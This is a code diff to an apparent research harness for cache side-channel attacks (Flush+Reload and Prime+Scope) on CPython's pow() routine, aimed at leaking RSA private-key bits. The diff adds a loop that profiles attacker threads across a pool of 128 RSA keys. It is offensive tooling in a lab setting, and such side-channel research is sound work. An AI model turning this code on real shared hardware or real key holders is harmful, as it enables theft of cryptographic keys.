@@ -31,12 +31,12 @@ static uint64_t lat_buffer[CACHE_LINE_COUNT * PROFILE_ITERATIONS];
 static double cz_freq = 18.46, aw_freq = 18.18, at_freq = 18.18,
               aw_side_freq = 3.15, at_side_freq = 3.15;
 
-static const char *key_path_cz =
-    "experiments/cpython_pow/private_10+.pem";
-static const char *key_path_aw =
-    "experiments/cpython_pow/private_1+.pem";
-static const char *key_path_at =
-    "experiments/cpython_pow/private_(10000)+.pem";
+static const char *key_path_cz = "experiments/cpython_pow/private_10+.pem";
+static const char *key_path_aw = "experiments/cpython_pow/private_1+.pem";
+static const char *key_path_at = "experiments/cpython_pow/private_(10000)+.pem";
+
+static const char *key_pool_dir = "experiments/cpython_pow/rsa_key_pool";
+static int key_pool_size = 128;
 
 /* PS-mode pointer arrays, assigned at the start of PS_profile_pow(). */
 static uint64_t *sample_tsc[CACHE_LINE_COUNT];
@@ -316,7 +316,27 @@ build_cpython_pow_evsets(EVSet **evset_cz, EVSet **evset_aw, EVSet **evset_at) {
 	return 1;
 }
 
-void PS_profile_pow(int use_csi) {
+static void set_victim_key(const char *abs_path) {
+	snprintf((char *)sync_ctx.data, sync_ctx_data_size, "%s", abs_path);
+	sync_ctx_set_action(SYNC_CTX_SET_KEY);
+	pthread_barrier_wait(sync_ctx.barrier);
+	pthread_barrier_wait(sync_ctx.barrier);
+}
+
+static void run_attacker_threads(PS_attacker_thread_config_t *cz,
+                                 PS_attacker_thread_config_t *aw,
+                                 PS_attacker_thread_config_t *at) {
+	pthread_t thread0 = 0, thread1 = 0, thread2 = 0;
+	pthread_create(&thread0, NULL, PS_attacker_thread, cz);
+	pthread_create(&thread1, NULL, PS_attacker_thread, aw);
+	pthread_create(&thread2, NULL, PS_attacker_thread, at);
+
+	pthread_join(thread0, NULL);
+	pthread_join(thread1, NULL);
+	pthread_join(thread2, NULL);
+}
+
+int PS_profile_pow(int use_csi, int use_key_pool) {
 	PS_attacker_thread_config_t pt_consume_zero, pt_absorb_window,
 	    pt_absorb_trailing;
 
@@ -339,17 +359,22 @@ void PS_profile_pow(int use_csi) {
 	if (use_csi) {
 		if (cache_env_init(1)) {
 			log_error("Failed to initialize cache env!\n");
-			return;
+			return 1;
 		}
 		helper_thread_ctrl hctrl;
 		if (LLCF_multi_evset(0, &hctrl)) {
 			log_error("Failed to build evset");
 			sync_ctx_set_action(SYNC_CTX_EXIT);
 			pthread_barrier_wait(sync_ctx.barrier);
-			return;
+			return 1;
 		}
 	} else {
-		build_cpython_pow_evsets(&evset_cz, &evset_aw, &evset_at);
+		if (!build_cpython_pow_evsets(&evset_cz, &evset_aw, &evset_at)) {
+			log_error("Failed to build cpython pow evsets");
+			sync_ctx_set_action(SYNC_CTX_EXIT);
+			pthread_barrier_wait(sync_ctx.barrier);
+			return 1;
+		}
 	}
 
 	pthread_barrier_wait(sync_ctx.barrier);
@@ -360,9 +385,11 @@ void PS_profile_pow(int use_csi) {
 			log_error("Could not find target sets for cz, aw, and at");
 			sync_ctx_set_action(SYNC_CTX_EXIT);
 			pthread_barrier_wait(sync_ctx.barrier);
-			return;
+			return 1;
 		}
-		// FIXME(yayu): set key
+	}
+
+	if (!use_key_pool) {
 		config_t *cfg = get_config();
 		snprintf((char *)sync_ctx.data,
 		         sync_ctx_data_size,
@@ -376,7 +403,7 @@ void PS_profile_pow(int use_csi) {
 	if (pthread_barrier_init(
 	        &attacker_threads_barrier, NULL, CACHE_LINE_COUNT) != 0) {
 		log_error("Error initializing barrier\n");
-		return;
+		return 1;
 	}
 
 	PS_thread_config_init(pt_consume_zero);
@@ -403,23 +430,49 @@ void PS_profile_pow(int use_csi) {
 	    (uint8_t *)((uintptr_t)target_absorb_trailing + 2 * CACHE_LINE_SIZE);
 	pt_absorb_trailing.evset = evset_at;
 
-	pthread_t thread0 = 0, thread1 = 0, thread2 = 0;
-	pthread_create(&thread0, NULL, PS_attacker_thread, &pt_consume_zero);
-	pthread_create(&thread1, NULL, PS_attacker_thread, &pt_absorb_window);
-	pthread_create(&thread2, NULL, PS_attacker_thread, &pt_absorb_trailing);
+	if (use_key_pool) {
+		config_t *cfg = get_config();
+		char key_path[512], key_test_name[128];
 
-	pthread_join(thread0, NULL);
-	pthread_join(thread1, NULL);
-	pthread_join(thread2, NULL);
+		for (int key_id = 0; key_id < key_pool_size; ++key_id) {
+			snprintf(key_path,
+			         sizeof(key_path),
+			         "%s/%s/rsa_key_%d.pem",
+			         cfg->project_root,
+			         key_pool_dir,
+			         key_id);
+			log_info(LOG_BOLD_ON "Key pool %d/%d: %s" LOG_BOLD_OFF,
+			         key_id + 1,
+			         key_pool_size,
+			         key_path);
+
+			set_victim_key(key_path);
+			snprintf(key_test_name,
+			         sizeof(key_test_name),
+			         "cpython_pow_key_pool/cpython_pow_key%05d",
+			         key_id);
+
+			pt_consume_zero.test_name = key_test_name;
+			pt_absorb_window.test_name = key_test_name;
+			pt_absorb_trailing.test_name = key_test_name;
+
+			run_attacker_threads(
+			    &pt_consume_zero, &pt_absorb_window, &pt_absorb_trailing);
+		}
+	} else {
+		run_attacker_threads(
+		    &pt_consume_zero, &pt_absorb_window, &pt_absorb_trailing);
+	}
 
 	sync_ctx_set_action(SYNC_CTX_EXIT);
 	pthread_barrier_wait(sync_ctx.barrier);
+	return 0;
 }
 
 int main(int argc, char **argv) {
 	config_t *cfg = get_config();
 
-	int use_ff = 0, use_ps = 0, use_csi = 0;
+	int use_ff = 0, use_ps = 0, use_csi = 0, use_key_pool = 0;
 
 	for (int i = 1; i < argc; ++i) {
 		if (strcmp(argv[i], "-FR") == 0) {
@@ -428,6 +481,16 @@ int main(int argc, char **argv) {
 			use_ps = 1;
 		} else if (strcmp(argv[i], "-csi") == 0) {
 			use_csi = 1;
+		} else if (strcmp(argv[i], "-key_pool") == 0) {
+			use_key_pool = 1;
+		} else if (strcmp(argv[i], "-num_keys") == 0 && i + 1 < argc) {
+			char *endptr = NULL;
+			errno = 0;
+			const uint64_t value = strtoull(argv[++i], &endptr, 10);
+			if (errno == 0 && endptr != argv[i] && *endptr == '\0' &&
+			    value > 0) {
+				key_pool_size = (int)value;
+			}
 		} else {
 			char *endptr = NULL;
 			errno = 0;
@@ -439,12 +502,19 @@ int main(int argc, char **argv) {
 	}
 
 	if (!use_ff && !use_ps) {
-		log_error("Usage: %s [-FR | -PS] [-csi] [iterations]", argv[0]);
+		log_error("Usage: %s [-FR | -PS] [-csi] [-key_pool [-num_keys count]] "
+		          "[iterations]",
+		          argv[0]);
 		exit(1);
 	}
 
 	if (use_ff && use_ps) {
 		log_error("Cannot specify both -FR and -PS");
+		exit(1);
+	}
+
+	if (use_ff && use_key_pool) {
+		log_error("-key_pool is only supported with -PS");
 		exit(1);
 	}
 
@@ -455,9 +525,8 @@ int main(int argc, char **argv) {
 
 	if (use_ff) {
 		FF_profile_pow();
-	} else {
-		PS_profile_pow(use_csi);
+		return 0;
 	}
 
-	return 0;
+	return PS_profile_pow(use_csi, use_key_pool);
 }
